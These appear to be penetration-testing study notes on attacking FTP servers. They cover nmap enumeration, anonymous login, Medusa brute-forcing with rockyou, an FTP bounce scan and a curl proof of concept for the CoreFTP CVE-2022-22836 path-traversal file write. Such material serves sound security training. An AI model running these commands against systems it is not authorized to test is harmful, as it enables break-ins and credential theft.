# Attacking FTP

## 1. FTP Basics

**FTP (File Transfer Protocol)** transfers and manages files between systems.

* Default port: `TCP/21`
* Common attack surfaces:

  * Anonymous login
  * Weak credentials
  * Excessive file permissions
  * Brute forcing / password attacks
  * FTP bounce
  * Known service vulnerabilities
  * File upload → possible code execution when combined with another vulnerability

---

# 2. Enumeration

### Nmap

```bash
nmap -sC -sV -p21 <TARGET>
```

Useful information:

* FTP version/banner
* Anonymous authentication
* Directory/file listing
* Writable directories

### More aggressive FTP enumeration

```bash
nmap --script ftp-* -p21 <TARGET>
```

### Check anonymous access specifically

```bash
nmap --script ftp-anon -p21 <TARGET>
```

If you see:

```text
Anonymous FTP login allowed
```

→ Try anonymous authentication.

---

# 3. Connect to FTP

### FTP client

```bash
ftp <TARGET>
```

Login:

```text
Username: anonymous
Password: [Enter / anything]
```

### Netcat — banner grabbing

```bash
nc -nv <TARGET> 21
```

Useful for quickly identifying the FTP service/version.

---

# 4. FTP Client Commands

Once connected:

| Command        | Purpose                 |
| -------------- | ----------------------- |
| `ls`           | List files              |
| `pwd`          | Show current directory  |
| `cd <dir>`     | Change directory        |
| `get <file>`   | Download one file       |
| `mget <files>` | Download multiple files |
| `put <file>`   | Upload one file         |
| `mput <files>` | Upload multiple files   |
| `binary`       | Binary transfer mode    |
| `ascii`        | ASCII transfer mode     |
| `help`         | Show FTP commands       |
| `quit` / `bye` | Exit                    |

### Download

```text
ftp> get secret.txt
```

### Download multiple files

```text
ftp> mget *
```

### Upload

```text
ftp> put shell.php
```

---

# 5. Anonymous FTP

Try:

```text
Username: anonymous
Password: anonymous
```

or simply press Enter for the password.

If successful:

```text
230 Login successful
```

### Enumeration after login

```text
ftp> pwd
ftp> ls
ftp> cd <directory>
ftp> ls -la
```

Look for:

* Credentials
* Configuration files
* Backups
* SSH keys
* Web files
* Source code
* Documents
* Scripts
* Database files
* Writable directories

### Important

**Read access** → potentially sensitive information.

**Write access** → potentially dangerous, especially if uploaded files can later be executed by another service.

Example attack chain:

```text
FTP writable directory
        ↓
Upload malicious/script file
        ↓
Another service can access the file
        ↓
Path traversal / web execution / other vulnerability
        ↓
Code execution
```

FTP itself doesn't necessarily execute the uploaded file.

---

# 6. Brute Force

If anonymous access is disabled and valid credentials are unknown, credential attacks may be possible.

### Medusa

Single username:

```bash
medusa -u <USER> -P /usr/share/wordlists/rockyou.txt -h <TARGET> -M ftp
```

Username list:

```bash
medusa -U users.txt -P passwords.txt -h <TARGET> -M ftp
```

Options:

* `-u` → single username
* `-U` → username list
* `-P` → password list
* `-h` → target
* `-M ftp` → use FTP module

**Remember:** modern services often implement rate limiting/lockouts, so password spraying or other credential attacks may be more appropriate depending on the environment.

---

# 7. FTP Bounce Attack

An **FTP bounce attack** abuses an FTP server as a proxy to connect to another host.

```text
Attacker
   ↓
FTP Server
   ↓
Internal Target
```

This can potentially allow scanning systems that aren't directly reachable by the attacker.

### Nmap

```bash
nmap -Pn -v -n -p80 \
-b anonymous:password@<FTP_SERVER> \
<TARGET>
```

Where:

```text
-b = FTP bounce
anonymous:password = FTP credentials
<FTP_SERVER> = intermediate FTP server
<TARGET> = system to scan
```

If vulnerable/misconfigured, you may discover ports on an otherwise inaccessible host.

**Modern FTP servers commonly prevent FTP bounce by default.**

---

# 8. Known FTP Vulnerabilities

Always identify the exact FTP software/version first:

```bash
nmap -sV -p21 <TARGET>
```

Then investigate whether that version has known vulnerabilities.

General workflow:

```text
Enumerate
   ↓
Identify FTP software/version
   ↓
Search CVEs / advisories
   ↓
Verify affected version/configuration
   ↓
Test exploit in authorized environment
```

---

# 9. CoreFTP CVE-2022-22836

**CoreFTP before build 727**

Vulnerability chain:

```text
Authenticated access
       ↓
HTTP PUT request
       ↓
Directory traversal
       ↓
Escape authorized directory
       ↓
Arbitrary file write
```

### Example PoC

```bash
curl -k -X PUT \
-H "Host: <IP>" \
--basic -u <USERNAME>:<PASSWORD> \
--data-binary "PoC." \
--path-as-is \
https://<IP>/../../../../../../whoops
```

Important options:

* `-X PUT` → use HTTP PUT
* `-H` → set Host header
* `--basic` → HTTP Basic Authentication
* `-u` → username/password
* `--data-binary` → content to write
* `--path-as-is` → preserve `../` traversal
* `-k` → ignore TLS certificate validation

### Vulnerability concept

```text
../../../../
     ↓
Escape restricted directory
     ↓
Reach arbitrary path
     ↓
Write attacker-controlled content
```

This is **directory traversal + arbitrary file write**.

---

# 10. FTP Attack Workflow

```text
1. Discover port 21
        ↓
2. Identify FTP version
        ↓
3. Check anonymous login
        ↓
4. Enumerate files/directories
        ↓
5. Check read/write permissions
        ↓
6. Search for sensitive information
        ↓
7. Test credentials if authorized
        ↓
8. Check for FTP-specific attacks
        ↓
9. Search version for known vulnerabilities
        ↓
10. Look for ways FTP access can lead to further compromise
```

---

## Quick Commands

```bash
# Enumeration
nmap -sC -sV -p21 <TARGET>

# FTP scripts
nmap --script ftp-* -p21 <TARGET>

# Connect
ftp <TARGET>

# Banner
nc -nv <TARGET> 21

# Medusa
medusa -u <USER> -P /usr/share/wordlists/rockyou.txt -h <TARGET> -M ftp

# FTP bounce
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_SERVER> <TARGET>
```

## Key Things to Remember

* **21/tcp = FTP control connection**
* Always check **anonymous access**.
* `ls`, `cd`, `get`, `mget`, `put`, `mput` are the core FTP commands.
* **Read permission** can expose sensitive data.
* **Write permission** can become dangerous when another service processes uploaded files.
* Identify the **exact FTP software/version** before searching for exploits.
* FTP bounce abuses an FTP server to reach/scan another host.
* `--path-as-is` is important when testing HTTP directory traversal with `curl`.
* FTP access does **not automatically mean code execution**; look for an additional execution path.
